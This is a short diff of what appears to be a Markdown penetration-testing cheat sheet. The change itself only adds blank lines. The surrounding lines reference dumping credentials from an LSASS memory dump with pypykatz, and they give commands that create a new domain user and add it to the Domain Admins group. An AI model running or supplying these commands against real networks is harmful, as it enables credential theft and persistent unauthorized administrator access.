@@ -596,10 +596,12 @@ pypykatz lsa minidump lsass.DMP
 
 <details>
   <summary> Command to add a new Domain Admin </summary> 
+  
   #### Create the new user
   ```ps
   net user JohnDoe MyPassword123 /add /domain
   ```
+
   #### Add the new user to the Domain Admins group
   ```ps
   'net group "Domain Admins" <username> /add /domain'
